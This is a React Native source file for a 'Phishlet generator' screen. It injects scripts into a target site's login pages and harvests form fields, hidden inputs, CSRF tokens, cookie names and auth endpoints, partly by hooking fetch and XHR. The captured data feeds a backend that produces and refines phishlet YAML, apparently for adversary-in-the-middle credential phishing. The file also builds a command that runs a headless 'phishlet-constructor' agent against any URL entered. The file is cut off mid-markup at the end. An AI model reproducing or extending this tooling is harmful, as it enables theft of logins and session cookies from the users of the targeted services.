import { LinearGradient } from "expo-linear-gradient";
import * as Clipboard from "expo-clipboard";
import { Check, Copy, ExternalLink, Fingerprint, Globe, Loader, Radar, RefreshCw, Scroll, Server, Shield, Wand2, Zap } from "lucide-react-native";
import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  ActivityIndicator,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import WebView from "@/components/WebView";

import OfflineCard from "@/components/OfflineCard";
import PressableScale from "@/components/PressableScale";
import PulseDot from "@/components/PulseDot";
import { theme } from "@/constants/theme";
import { useApiKey } from "@/hooks/useApiKey";
import { useGenerateLoginPhishlet, useGeneratePhishlet, useIteratePhishlet, useProxies } from "@/hooks/useGateway";
import { getBaseUrl, proxyUrl } from "@/lib/api";
import type { CritiqueEntry } from "@/lib/api";

// ── Focused login-form probe used by the PhishletGen-Automator mode ──
const LOGIN_PROBE_SCRIPT = `
(function() {
  'use strict';
  function visibleArea(el) {
    var rect = el.getBoundingClientRect();
    return Math.max(0, rect.width) * Math.max(0, rect.height);
  }
  function isHttps(action) {
    try { return new URL(action, location.href).protocol === 'https:'; } catch(e) { return false; }
  }
  function hasPassword(form) { return !!form.querySelector('input[type="password"]'); }
  function findBestLoginForm() {
    var forms = Array.from(document.querySelectorAll('form')).filter(hasPassword);
    if (forms.length === 0) return null;
    var scored = forms.map(function(f) {
      var action = f.action || location.href;
      return { form: f, https: isHttps(action) ? 1 : 0, area: visibleArea(f), action: action };
    });
    scored.sort(function(a, b) {
      if (b.https !== a.https) return b.https - a.https;
      return b.area - a.area;
    });
    return scored[0].form;
  }
  function getLoginPath(form) {
    try {
      var action = form.action || location.href;
      return new URL(action, location.href).pathname || '/';
    } catch(e) { return '/'; }
  }
  function getSubmitSelector(form) {
    if (form.id) return 'form#' + form.id;
    if (form.name) return 'form[name="' + form.name + '"]';
    if (form.className) {
      var cls = form.className.split(/\\s+/).filter(Boolean)[0];
      if (cls) return 'form.' + cls + ':has(> input[type="password"])';
    }
    return 'form:has(> input[type="password"])';
  }
  function getPasswordInput(form) { return form.querySelector('input[type="password"]'); }
  function getUsernameInput(form, passwordInput) {
    var inputs = Array.from(form.querySelectorAll('input'));
    var pwIndex = passwordInput ? inputs.indexOf(passwordInput) : -1;
    for (var i = pwIndex - 1; i >= 0; i--) {
      var t = (inputs[i].type || 'text').toLowerCase();
      if (t === 'text' || t === 'email' || t === 'tel') return inputs[i];
    }
    for (var j = 0; j < inputs.length; j++) {
      var t2 = (inputs[j].type || 'text').toLowerCase();
      if (t2 === 'text' || t2 === 'email' || t2 === 'tel') return inputs[j];
    }
    return null;
  }
  function extractLoginForm() {
    var form = findBestLoginForm();
    if (!form) return null;
    var pw = getPasswordInput(form);
    var user = getUsernameInput(form, pw);
    var hidden = Array.from(form.querySelectorAll('input[type="hidden"]')).map(function(h) {
      return { name: h.name || h.id || '', value: h.value || '' };
    }).filter(function(h) { return h.name; });
    return {
      domain: location.hostname,
      loginPath: getLoginPath(form),
      submitSelector: getSubmitSelector(form),
      usernameField: user ? (user.name || user.id || 'username') : 'username',
      passwordField: pw ? (pw.name || pw.id || 'password') : 'password',
      hiddenInputs: hidden
    };
  }
  function send() {
    var data = extractLoginForm();
    if (data && window.ReactNativeWebView) {
      window.ReactNativeWebView.postMessage(JSON.stringify({ loginForm: data }));
    }
  }
  send();
  setTimeout(send, 1000);
  setTimeout(send, 2500);
})();
`;

// ── Injected capture script — enhanced probe for modern auth flows ──
const CAPTURE_SCRIPT = `
(function() {
  'use strict';
  var PH = window.__phishletCapture || (window.__phishletCapture = {
    domains: [], urls: [], cookies: [], formFields: [], hiddenInputs: [],
    csrfFields: [], authLinks: [], apiEndpoints: [], scripts: [], forms: [],
    redirects: [], pageTitle: '', formAction: '', formMethod: '',
  });

  function findBestForm() {
    var forms = Array.from(document.querySelectorAll('form'));
    for (var i = 0; i < forms.length; i++) {
      if (forms[i].querySelector('input[type=password]')) return forms[i];
    }
    for (var j = 0; j < forms.length; j++) {
      var inputs = forms[j].querySelectorAll('input');
      for (var k = 0; k < inputs.length; k++) {
        var n = (inputs[k].name || inputs[k].id || '').toLowerCase();
        if (/user|email|login|username|account|identifier/.test(n)) return forms[j];
      }
    }
    return forms[0] || null;
  }

  function recordUnique(key, value) {
    if (!PH._seen) PH._seen = {};
    if (!PH._seen[key]) PH._seen[key] = {};
    var s = typeof value === 'string' ? value : JSON.stringify(value);
    if (PH._seen[key][s]) return false;
    PH._seen[key][s] = true;
    if (!Array.isArray(PH[key])) PH[key] = [];
    PH[key].push(value);
    return true;
  }

  function absoluteUrl(href) {
    try { return new URL(href, location.href).href; } catch(e) { return ''; }
  }

  function isAuthUrl(href) {
    return /login|signin|sign-in|auth|register|signup|account|oauth|sso|saml|openid|password|forgot|token|/i.test(href);
  }

  function isApiUrl(href) {
    return /\\/(api|graphql|oauth|token|auth|session|sessions|saml|login)\\b|\\.(api|graphql)$/i.test(href);
  }

  function collect() {
    var payload = {};
    payload.pageTitle = document.title || '';
    var bestForm = findBestForm();
    if (bestForm) {
      payload.formAction = bestForm.action || location.href;
      payload.formMethod = (bestForm.method || 'get').toLowerCase();
    }

    var allInputs = Array.from(document.querySelectorAll('input, select, textarea'));
    var seen = {};
    var fields = [];
    var hidden = [];
    var csrf = [];
    allInputs.forEach(function(el) {
      var key = el.name || el.id || el.placeholder || el.type;
      if (!key || seen[key]) return;
      seen[key] = true;
      var type = (el.type || 'text').toLowerCase();
      var entry = {
        name: el.name || '',
        type: type,
        id: el.id || '',
        placeholder: el.placeholder || '',
        required: !!el.required,
        autocomplete: el.autocomplete || '',
      };
      fields.push(entry);
      if (type === 'hidden') {
        hidden.push({ name: el.name || '', value: el.value || '', id: el.id || '' });
      }
      var keyLower = key.toLowerCase();
      if (/csrf|xsrf|token|nonce|state|_requesttoken|__viewstate/.test(keyLower)) {
        csrf.push({ name: el.name || '', value: el.value || '', id: el.id || '' });
      }
    });
    payload.formFields = fields;
    payload.hiddenInputs = hidden;
    payload.csrfFields = csrf;

    var rawCookies = document.cookie ? document.cookie.split(';') : [];
    var cookieNames = [];
    rawCookies.forEach(function(c) { var name = c.trim().split('=')[0].trim(); if (name) cookieNames.push(name); });
    payload.cookies = cookieNames;
    payload.allCookies = cookieNames;

    payload.urls = [location.href];
    payload.authLinks = [];
    Array.from(document.querySelectorAll('a[href], button[data-href], [data-oauth-url]')).forEach(function(a) {
      var h = a.getAttribute('href') || a.getAttribute('data-href') || a.getAttribute('data-oauth-url') || '';
      if (!h) return;
      var abs = absoluteUrl(h);
      if (!abs) return;
      var text = (a.textContent || '').trim().slice(0, 60);
      if (isAuthUrl(h)) {
        payload.urls.push(abs);
        payload.authLinks.push({ href: abs, text: text });
      } else if (isApiUrl(h)) {
        payload.apiEndpoints.push(abs);
      }
    });

    payload.domains = [location.hostname];
    payload.scripts = [];
    Array.from(document.querySelectorAll('a[href], img[src], script[src], link[href], iframe[src]')).forEach(function(el) {
      var attr = el.getAttribute('href') || el.getAttribute('src') || '';
      var m = attr.match(/^https?:\\/\\/([^/?#]+)/i);
      if (m && m[1] !== location.hostname) {
        payload.domains.push(m[1]);
        if (el.tagName === 'SCRIPT' && attr) payload.scripts.push(m[1]);
      }
    });

    payload.forms = Array.from(document.querySelectorAll('form')).map(function(f) {
      return {
        action: absoluteUrl(f.action || location.href) || location.href,
        method: (f.method || 'get').toLowerCase(),
        id: f.id || '',
        name: f.name || '',
      };
    });

    payload.redirects = [location.href];

    ['urls','cookies','formFields','hiddenInputs','csrfFields','authLinks','apiEndpoints','scripts','forms','redirects','domains'].forEach(function(k) {
      var incoming = payload[k] || [];
      incoming.forEach(function(v) { recordUnique(k, v); });
    });

    if (payload.pageTitle) PH.pageTitle = payload.pageTitle;
    if (payload.formAction) PH.formAction = payload.formAction;
    if (payload.formMethod) PH.formMethod = payload.formMethod;

    window.ReactNativeWebView && window.ReactNativeWebView.postMessage(JSON.stringify({
      urls: PH.urls, cookies: PH.cookies, formFields: PH.formFields,
      hiddenInputs: PH.hiddenInputs, csrfFields: PH.csrfFields,
      authLinks: PH.authLinks, apiEndpoints: PH.apiEndpoints,
      scripts: PH.scripts, forms: PH.forms,
      redirects: PH.redirects, domains: PH.domains,
      pageTitle: PH.pageTitle, formAction: PH.formAction, formMethod: PH.formMethod
    }));
  }

  // Hook XHR / fetch to capture API endpoints.
  try {
    var _fetch = window.fetch;
    window.fetch = function() {
      var arg = arguments[0];
      var url = typeof arg === 'string' ? arg : (arg && arg.url) || '';
      if (url && isApiUrl(url)) recordUnique('apiEndpoints', url);
      return _fetch.apply(this, arguments);
    };
  } catch(e) {}
  try {
    var _XHR = window.XMLHttpRequest;
    var HookedXHR = function() {
      var xhr = new _XHR();
      var _open = xhr.open;
      xhr.open = function(method, url) {
        if (url && isApiUrl(url)) recordUnique('apiEndpoints', url);
        return _open.apply(xhr, arguments);
      };
      return xhr;
    };
    HookedXHR.prototype = _XHR.prototype;
    window.XMLHttpRequest = HookedXHR;
  } catch(e) {}

  // Observe dynamic DOM changes (SPA forms, OAuth popups, etc).
  try {
    var observer = new MutationObserver(function() { collect(); });
    observer.observe(document.documentElement, { childList: true, subtree: true });
  } catch(e) {}

  (function(){
    var _ps = history.pushState, _rs = history.replaceState;
    history.pushState = function() { _ps.apply(this, arguments); setTimeout(collect, 800); };
    history.replaceState = function() { _rs.apply(this, arguments); setTimeout(collect, 800); };
    window.addEventListener('popstate', function() { setTimeout(collect, 800); });
  })();

  document.addEventListener('submit', function(e) {
    var f = e.target;
    if (f && f.tagName === 'FORM') { PH.formAction = f.action || location.href; PH.formMethod = (f.method || 'get').toLowerCase(); }
    setTimeout(collect, 300);
  }, true);
  document.addEventListener('click', function(e) {
    var el = e.target;
    if (el && (el.tagName === 'BUTTON' || el.type === 'submit')) setTimeout(collect, 500);
  });
  setTimeout(collect, 800);
  setTimeout(collect, 2500);
  setTimeout(collect, 5000);
})();
`;

// ── Pipeline stage enum ──
type Stage = "idle" | "scanning" | "generating" | "iterating" | "done";

export default function ReconScreen() {
  const insets = useSafeAreaInsets();
  const ah = useApiKey();
  const { data: proxies = [], isLoading, isError, refetch } = useProxies();
  const generate = useGeneratePhishlet(ah);
  const iterate = useIteratePhishlet(ah);
  const generateLogin = useGenerateLoginPhishlet(ah);

  const [selectedSlug, setSelectedSlug] = useState<string>("");
  const [captured, setCaptured] = useState<Record<string, unknown>>({});
  const [activeUrl, setActiveUrl] = useState<string>("");
  const [webviewKey, setWebviewKey] = useState(0);
  const [stage, setStage] = useState<Stage>("idle");
  const [generated, setGenerated] = useState<string>("");
  const [refinedYaml, setRefinedYaml] = useState<string>("");
  const [iterateResult, setIterateResult] = useState<{ critiques: CritiqueEntry[]; improvements: string[]; passes: number; score: number } | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  // Login-phishlet mode (PhishletGen-Automator)
  const [loginMode, setLoginMode] = useState(false);
  const [loginUrl, setLoginUrl] = useState<string>("");
  const [loginYaml, setLoginYaml] = useState<string>("");
  const [showAgentCommand, setShowAgentCommand] = useState(false);

  const selected = useMemo(
    () => proxies.find((p) => p.slug === selectedSlug),
    [proxies, selectedSlug],
  );

  const agentCommand = useMemo(() => {
    if (!selected || !loginUrl.trim()) return "";
    try {
      const url = new URL(loginUrl.trim());
      if (url.protocol !== "http:" && url.protocol !== "https:") return "";
    } catch { return ""; }
    return `cd /Users/adminuser/rork-fullstack-edge-demo-1 && \\
GATEWAY_BASE_URL=${getBaseUrl()} \\
GATEWAY_API_KEY=$GATEWAY_API_KEY \\
PROXY_ID=${selected.id} \\
npx tsx agents/phishlet-constructor.ts \\
  --target-url "${loginUrl.trim()}" \\
  --authorized`;
  }, [selected, loginUrl]);

  // Auto-select proxy if only one exists
  useEffect(() => {
    if (proxies.length === 1 && !selectedSlug) {
      setSelectedSlug(proxies[0].slug);
    }
  }, [proxies, selectedSlug]);

  // ── One-tap scan: launch browser + start the pipeline ──
  const runScan = useCallback(() => {
    if (!selected) return;
    setCaptured({});
    setGenerated("");
    setRefinedYaml("");
    setIterateResult(null);
    setLoginMode(false);
    setLoginYaml("");
    setStage("scanning");
    const url = proxyUrl(selected.slug);
    setActiveUrl(url);
    setWebviewKey((k) => k + 1);
  }, [selected]);

  // ── PhishletGen-Automator: scan a direct URL for its login form ──
  const runLoginScan = useCallback(() => {
    if (!selected || !loginUrl.trim()) return;
    try {
      const url = new URL(loginUrl.trim());
      if (url.protocol !== "http:" && url.protocol !== "https:") return;
    } catch { return; }
    setLoginMode(true);
    setLoginYaml("");
    setCaptured({});
    setGenerated("");
    setRefinedYaml("");
    setIterateResult(null);
    setActiveUrl(loginUrl.trim());
    setWebviewKey((k) => k + 1);
  }, [selected, loginUrl]);

  // Auto-generate login phishlet when the focused probe reports a form.
  useEffect(() => {
    if (loginMode && captured.loginForm && !generateLogin.isPending && !loginYaml) {
      const form = captured.loginForm as Record<string, unknown>;
      generateLogin.mutate(
        {
          proxyId: selected!.id,
          input: {
            targetUrl: activeUrl || loginUrl,
            loginForm: {
              domain: form.domain as string | undefined,
              loginPath: form.loginPath as string | undefined,
              submitSelector: form.submitSelector as string | undefined,
              usernameField: form.usernameField as string | undefined,
              passwordField: form.passwordField as string | undefined,
              hiddenInputs: (form.hiddenInputs as { name: string; value: string }[]) ?? [],
            },
          },
        },
        { onSuccess: (data) => setLoginYaml(data.phishlet) },
      );
    }
  }, [loginMode, captured, generateLogin, loginYaml, activeUrl, loginUrl, selected]);

  // ── WebView message handler ──
  const onMessage = useCallback((event: { nativeEvent: { data?: string | Record<string, unknown> } }) => {
    try {
      // React Native WebView may auto-parse JSON strings into objects before
      // delivering to onMessage, so we handle both raw strings and objects.
      const raw = event.nativeEvent.data;
      if (raw == null) return;
      const data: Record<string, unknown> =
        typeof raw === "string" ? JSON.parse(raw) as Record<string, unknown> : raw;
      setCaptured((prev) => {
        const merged: Record<string, unknown> = { ...prev };
        for (const key of [
          "urls", "cookies", "formFields", "hiddenInputs", "csrfFields",
          "authLinks", "apiEndpoints", "scripts", "forms", "redirects", "domains",
        ]) {
          const arr: unknown[] = Array.isArray(data[key]) ? data[key] as unknown[] : [];
          const existing = (merged[key] as unknown[]) ?? [];
          const seen = new Set(existing.map((v) => typeof v === "string" ? v : JSON.stringify(v)));
          for (const item of arr) {
            const s = typeof item === "string" ? item : JSON.stringify(item);
            if (!seen.has(s)) { seen.add(s); existing.push(item); }
          }
          merged[key] = existing;
        }
        if (data.pageTitle) merged.pageTitle = String(data.pageTitle);
        if (data.formAction) merged.formAction = String(data.formAction);
        if (data.formMethod) merged.formMethod = String(data.formMethod);
        if (data.loginForm && typeof data.loginForm === "object") {
          merged.loginForm = data.loginForm as Record<string, unknown>;
        }
        return merged;
      });
    } catch { /* ignore */ }
  }, []);

  // ── Auto-trigger generation when we have enough captured data ──
  const hasCaptureData = useMemo(() => {
    const fields = (captured.formFields as unknown[]) ?? [];
    return fields.length > 0 || captured.pageTitle != null;
  }, [captured]);

  useEffect(() => {
    if (stage === "scanning" && hasCaptureData && !generate.isPending && !generated) {
      setStage("generating");
      const cap = {
        urls: (captured.urls as string[]) ?? [],
        cookies: (captured.cookies as string[]) ?? [],
        formFields: (captured.formFields as { name: string; type: string; id?: string; placeholder?: string; required?: boolean; autocomplete?: string }[]) ?? [],
        redirects: (captured.redirects as string[]) ?? [],
        domains: (captured.domains as string[]) ?? [],
        pageTitle: captured.pageTitle as string | undefined,
        formAction: captured.formAction as string | undefined,
        formMethod: captured.formMethod as string | undefined,
        hiddenInputs: (captured.hiddenInputs as { name: string; value: string; id?: string }[]) ?? [],
        csrfFields: (captured.csrfFields as { name: string; value: string; id?: string }[]) ?? [],
        authLinks: (captured.authLinks as { href: string; text: string }[]) ?? [],
        apiEndpoints: (captured.apiEndpoints as string[]) ?? [],
        scripts: (captured.scripts as string[]) ?? [],
        forms: (captured.forms as { action: string; method: string; id?: string; name?: string }[]) ?? [],
      };
      generate.mutate(
        { proxyId: selected!.id, input: { targetUrl: selected!.targetUrl, captured: cap } },
        { onSuccess: (data) => setGenerated(data.phishlet) },
      );
    }
  }, [stage, hasCaptureData, captured, generate, generated, selected]);

  // ── Auto-trigger iteration after generation ──
  useEffect(() => {
    if (stage === "generating" && generated && !iterate.isPending && !refinedYaml) {
      setStage("iterating");
      const cap = {
        urls: (captured.urls as string[]) ?? [],
        cookies: (captured.cookies as string[]) ?? [],
        formFields: (captured.formFields as { name: string; type: string; id?: string; placeholder?: string; required?: boolean; autocomplete?: string }[]) ?? [],
        redirects: (captured.redirects as string[]) ?? [],
        domains: (captured.domains as string[]) ?? [],
        pageTitle: captured.pageTitle as string | undefined,
        formAction: captured.formAction as string | undefined,
        formMethod: captured.formMethod as string | undefined,
        hiddenInputs: (captured.hiddenInputs as { name: string; value: string; id?: string }[]) ?? [],
        csrfFields: (captured.csrfFields as { name: string; value: string; id?: string }[]) ?? [],
        authLinks: (captured.authLinks as { href: string; text: string }[]) ?? [],
        apiEndpoints: (captured.apiEndpoints as string[]) ?? [],
        scripts: (captured.scripts as string[]) ?? [],
        forms: (captured.forms as { action: string; method: string; id?: string; name?: string }[]) ?? [],
      };
      iterate.mutate(
        { proxyId: selected!.id, phishlet: generated, captured: cap },
        {
          onSuccess: (data) => {
            setRefinedYaml(data.phishlet);
            setIterateResult({
              critiques: data.critiques,
              improvements: data.improvements,
              passes: data.passes,
              score: data.score,
            });
            setStage("done");
          },
        },
      );
    }
  }, [stage, generated, captured, iterate, refinedYaml, selected]);

  const copy = async (v: string, field: string) => {
    await Clipboard.setStringAsync(v);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 1400);
  };

  const reset = () => {
    setCaptured({});
    setGenerated("");
    setRefinedYaml("");
    setIterateResult(null);
    setStage("idle");
    setActiveUrl("");
    setLoginMode(false);
    setLoginUrl("");
    setLoginYaml("");
  };

  const stageLabel: Record<Stage, string> = {
    idle: "",
    scanning: "Scanning target — browse the login page…",
    generating: "Generating phishlet YAML…",
    iterating: "Self-critique & refining…",
    done: "Scan complete",
  };
  const stageIcon: Record<Stage, React.ElementType | null> = {
    idle: null, scanning: Radar, generating: Wand2, iterating: RefreshCw, done: Check,
  };
  const stageColor: Record<Stage, string> = {
    idle: theme.colors.textFaint, scanning: theme.colors.cyan, generating: theme.colors.accent,
    iterating: theme.colors.warn, done: theme.colors.ok,
  };

  return (
    <View style={styles.root}>
      <LinearGradient
        colors={[theme.colors.accentGlow, "transparent"]}
        start={{ x: 0.1, y: 0 }}
        end={{ x: 0.9, y: 0.5 }}
        style={styles.glow}
        pointerEvents="none"
      />
      <ScrollView
        contentContainerStyle={[styles.content, { paddingTop: insets.top + theme.spacing(6) }]}
        showsVerticalScrollIndicator={false}
      >
        {/* Header */}
        <View>
          <Text style={styles.eyebrow}>RECONNAISSANCE</Text>
          <Text style={styles.hero}>Phishlet generator</Text>
          <Text style={styles.sub}>
            One tap to scan a target, capture its login flow, and auto-generate a refined YAML phishlet with multi-pass validation.
          </Text>
        </View>

        {isLoading ? (
          <ActivityIndicator color={theme.colors.accent} />
        ) : isError ? (
          <OfflineCard message="Could not load proxy targets." onRetry={() => refetch()} />
        ) : proxies.length === 0 ? (
          <View style={styles.stateCard}>
            <Radar size={28} color={theme.colors.textFaint} />
            <Text style={styles.stateText}>Create a proxy target first to run reconnaissance.</Text>
          </View>
        ) : (
          <>
            {/* Target selector + scan button in one row */}
            <View style={styles.controlCard}>
              <View style={styles.controlTop}>
                <Text style={styles.controlLabel}>TARGET</Text>
                <View style={styles.proxyChips}>
                  {proxies.map((p) => (
                    <Pressable
                      key={p.slug}
                      onPress={() => { setSelectedSlug(p.slug); reset(); }}
                      style={[styles.chip, selectedSlug === p.slug && styles.chipActive]}
                    >
                      <Globe size={11} color={selectedSlug === p.slug ? theme.colors.warn : theme.colors.textFaint} />
                      <Text style={[styles.chipText, selectedSlug === p.slug && styles.chipTextActive]} numberOfLines={1}>
                        {p.name || p.slug}
                      </Text>
                    </Pressable>
                  ))}
                </View>
              </View>
              {selected && (
                <PressableScale
                  haptic="heavy"
                  onPress={runScan}
                  disabled={stage !== "idle" && stage !== "done"}
                  style={[
                    styles.scanBtn,
                    stage !== "idle" && stage !== "done" && styles.scanBtnBusy,
                  ]}
                >
                  {stage === "idle" || stage === "done" ? (
                    <>
                      <Radar size={16} color={theme.colors.bg} />
                      <Text style={styles.scanBtnText}>{stage === "done" ? "Rescan" : "Run scan"}</Text>
                    </>
                  ) : (
                    <>
                      <Loader size={16} color={theme.colors.bg} />
                      <Text style={styles.scanBtnText}>{stageLabel[stage]}</Text>
                    </>
                  )}
                </PressableScale>
              )}
            </View>

            {/* Login Phishlet Automator */}
            {selected && (
              <View style={[styles.controlCard, styles.loginCard]}>
                <Text style={styles.controlLabel}>LOGIN PHISHLET AUTOMATOR</Text>
                <View style={styles.loginRow}>
                  <TextInput
                    value={loginUrl}
                    onChangeText={setLoginUrl}
                    placeholder="https://target.com/login"
                    placeholderTextColor={theme.colors.textFaint}
                    autoCapitalize="none"
                    autoCorrect={false}
                    keyboardType="url"
                    style={styles.loginInput}
                  />
                  <PressableScale
                    haptic="medium"
                    onPress={runLoginScan}
                    disabled={!loginUrl.trim() || generateLogin.isPending}
                    style={[
                      styles.loginBtn,
                      (!loginUrl.trim() || generateLogin.isPending) && styles.loginBtnDisabled,
                    ]}
                  >
                    {generateLogin.isPending ? (
                      <Loader size={14} color={theme.colors.bg} />
                    ) : (
                      <>
                        <Fingerprint size={14} color={theme.colors.bg} />
                        <Text style={styles.loginBtnText}>Generate</Text>
                      </>
                    )}
                  </PressableScale>
                </View>

                {loginYaml ? (
                  <View style={styles.loginYamlCard}>
                    <View style={styles.loginYamlHeader}>
                      <Text style={styles.loginYamlTitle}>Generated YAML</Text>
                      <Pressable onPress={() => copy(loginYaml, "loginYaml")} style={styles.copyBtn}>
                        {copiedField === "loginYaml" ? (
                          <Check size={14} color={theme.colors.ok} />
                        ) : (
                          <Copy size={14} color={theme.colors.cyan} />
                        )}
                      </Pressable>
                    </View>
                    <Text style={styles.loginYamlApplied}>
                      Applied to proxy: {selected?.name || selected?.slug}
                    </Text>
                    <Text style={styles.loginYaml} numberOfLines={12} ellipsizeMode="tail">
                      {loginYaml}
                    </Text>
                  </View>
                ) : loginMode && !captured.loginForm ? (
                  <View style={styles.loginStatus}>
                    <Loader size={14} color={theme.colors.accent} />
                    <Text style={styles.loginStatusText}>Navigating and probing login form…</Text>
                  </View>
                ) : null}
              </View>
            )}

            {/* Headless Agent workflow */}
            {selected && (
              <View style={[styles.controlCard, styles.agentCard]}>
                <Text style={styles.controlLabel}>HEADLESS AGENT</Text>
                <Text style={styles.agentSub}>
                  Run the Puppeteer agent locally and have it upload the result back to this proxy.
                </Text>
                <PressableScale
                  haptic="medium"
                  onPress={() => setShowAgentCommand((s) => !s)}
                  disabled={!agentCommand}
                  style={[styles.agentToggle, !agentCommand && styles.agentToggleDisabled]}
                >
                  <Server size={14} color={theme.colors.bg} />
                  <Text style={styles.agentToggleText}>
                    {showAgentCommand ? "Hide command" : "Show command"}
                  </Text>
                </PressableScale>

                {showAgentCommand && agentCommand ? (
                  <View style={styles.agentCommandCard}>
                    <View style={styles.loginYamlHeader}>
                      <Text style={styles.loginYamlTitle}>Terminal command</Text>
                      <Pressable onPress={() => copy(agentCommand, "agentCommand")} style={styles.copyBtn}>
                        {copiedField === "agentCommand" ? (
                          <Check size={14} color={theme.colors.ok} />
                        ) : (
                          <Copy size={14} color={theme.colors.cyan} />
                        )}
                      </Pressable>
                    </View>
                    <Text style={styles.agentCommand}>{agentCommand}</Text>
                    <Text style={styles.agentNote}>
                      Set GATEWAY_API_KEY in your terminal first, then paste and run. The agent will upload the YAML to proxy {selected?.name || selected?.slug} after validation.
                    </Text>
                  </View>
                ) : null}
              </View>
            )}

            {/* Pipeline progress indicator */}
            {stage !== "idle" && (
              <View style={[styles.progressBar, { borderColor: stageColor[stage] }]}>
                <View style={styles.progressSteps}>
                  {(["scanning", "generating", "iterating", "done"] as Stage[]).map((s) => {
                    const passed = (s === "scanning" && (stage === "generating" || stage === "iterating" || stage === "done")) ||
                      (s === "generating" && (stage === "iterating" || stage === "done")) ||
                      (s === "iterating" && stage === "done");
                    const current = stage === s;
                    return (
                      <View key={s} style={styles.progressStep}>
                        <View style={[
                          styles.progressDot,
                          current && { backgroundColor: stageColor[s], borderColor: stageColor[s] },
                          passed && { backgroundColor: theme.colors.ok, borderColor: theme.colors.ok },
                        ]}>
                          {passed ? <Check size={8} color={theme.colors.bg} /> : current ? <Loader size={8} color={theme.colors.bg} /> : null}
                        </View>
                        <Text style={[
                          styles.progressLabel,
                          (current || passed) && { color: passed ? theme.colors.ok : stageColor[s] },
                        ]}>
                          {s === "scanning" ? "Capture" : s === "generating" ? "Generate" : s === "iterating" ? "Refine" : "Done"}
                        </Text>
                      </View>
                    );
                  })}
                </View>
              </View>
            )}

            {/* Browser panel */}
            {selected && stage !== "idle" && (
              <View style={styles.browserPanel}>
                <View style={styles.browserHeader}>
                  <View style={styles.browserUrlWrap}>
                    <Globe size={12} color={theme.colors.cyan} />
                    <Text style={styles.browserUrl} numberOfLines={1}>{activeUrl || "Connecting…"}</Text>
                  </View>
                  {stage !== "scanning" && (
                    <Pressable onPress={() => { setActiveUrl(""); setStage("idle"); }} style={styles.closeBrowser}>
                      <Text style={styles.closeBrowserText}>Close browser</Text>
                    </Pressable>
                  )}
                </View>
                <View style={styles.webviewWrap}>
                  <WebView
                    key={webviewKey}
                    source={{ uri: activeUrl }}
                    injectedJavaScript={loginMode ? LOGIN_PROBE_SCRIPT : CAPTURE_SCRIPT}
                    onMessage={onMessage}
                    style={styles.webview}
                    javaScriptEnabled
                    thirdPartyCookiesEnabled
                    domStorageEnabled
                  />
                </View>
              </View>
            )}

            {/* Captured intelligence — live updating during scan */}
            {stage !== "idle" && (
              <View style={styles.intelCard}>
                <View style={styles.intelHeader}>
                  <Fingerprint size={14} color={stage === "scanning" ? theme.colors.cyan : theme.colors.accent} />
                  <Text style={styles.intelTitle}>Captured intelligence</Text>
                  {stage === "scanning" && <PulseDot active size={8} color={theme.colors.cyan} />}
                </View>
                {captured.pageTitle ? (
                  <View style={styles.intelRow}>
                    <Globe size={11} color={theme.colors.textFaint} />
                    <Text style={styles.intelVal} numberOfLines={1}>{captured.pageTitle as string}</Text>
                  </View>
                ) : null}
                {captured.formAction ? (
                  <View style={styles.intelRow}>
                    <Server size={11} color={theme.colors.textFaint} />
                    <Text style={styles.intelVal} numberOfLines={1}>{(captured.formMethod as string)?.toUpperCase() ?? "POST"} {(captured.formAction as string)}</Text>
                  </View>
                ) : null}
                <View style={styles.metrics}>
                  <MiniMetric label="URLs" value={(captured.urls as string[])?.length ?? 0} />
                  <MiniMetric label="Fields" value={(captured.formFields as unknown[])?.length ?? 0} />
                  <MiniMetric label="Cookies" value={(captured.cookies as string[])?.length ?? 0} />
                  <MiniMetric label="Domains" value={(captured.domains as string[])?.length ?? 0} />
                </View>
                <View style={styles.metrics}>
                  <MiniMetric label="Hidden" value={(captured.hiddenInputs as unknown[])?.length ?? 0} />
                  <MiniMetric label="CSRF" value={(captured.csrfFields as unknown[])?.length ?? 0} />
                  <MiniMetric label="Auth URLs" value={(captured.authLinks as unknown[])?.length ?? 0} />
                  <MiniMetric label="APIs" value={(captured.apiEndpoints as string[])?.length ?? 0} />
                </View>
                {(captured.authLinks as { href: string; text: string }[])?.length > 0 && (
                  <View style={styles.detailList}>
                    <Text style={styles.detailListTitle}>Auth links</Text>
                    {(captured.authLinks as { href: string; text: string }[]).slice(0, 5).map((l, i) => (
                      <View key={i} style={styles.detailRow}>
                        <ExternalLink size={10} color={theme.colors.textFaint} />
                        <Text style={styles.detailText} numberOfLines={1}>{l.text || l.href}</Text>
                      </View>
                    ))}
                  </View>
                )}
                {(captured.apiEndpoints as string[])?.length > 0 && (
                  <View style={styles.detailList}>
                    <Text style={styles.detailListTitle}>API endpoints</Text>
                    {(captured.apiEndpoints as string[]).slice(0, 5).map((e, i) => (
                      <View key={i} style={styles.detailRow}>
                        <Server size={10} color={theme.colors.textFaint} />
                        <Text style={styles.detailText} numberOfLines={1}>{e}</Text>
                      </View>
                    ))}
                  </View>
                )}
              </View>
            )}

            {/* Generated YAML */}
            {generated ? (
              <View style={styles.resultCard}>
                <View style={styles.resultHeader}>
                  <Wand2 size={14} color={theme.colors.warn} />
                  <Text style={styles.resultTitle}>Generated phishlet</Text>
                </View>
                <ScrollView horizontal style={styles.codeScroll} showsHorizontalScrollIndicator={false}>
                  <Text style={styles.code}>{generated}</Text>
                </ScrollView>
                <Pressable onPress={() => copy(generated, "gen")} style={styles.copyRow}>
                  {copiedField === "gen" ? <Check size={12} color={theme.colors.ok} /> : <Copy size={12} color={theme.colors.accent} />}
                  <Text style={styles.copyText}>{copiedField === "gen" ? "Copied" : "Copy YAML"}</Text>
                </Pressable>
              </View>
            ) : null}

            {/* Iteration report + refined YAML */}
            {iterateResult ? (
              <View style={styles.resultCard}>
                <View style={styles.resultHeader}>
                  <Shield size={14} color={theme.colors.ok} />
                  <Text style={styles.resultTitle}>Refined phishlet</Text>
                  <View style={[styles.scoreBadge, iterateResult.score >= 80 ? styles.scoreGood : styles.scoreWarn]}>
                    <Text style={styles.scoreText}>{iterateResult.score}/100</Text>
                  </View>
                </View>
                <Text style={styles.iterateMeta}>
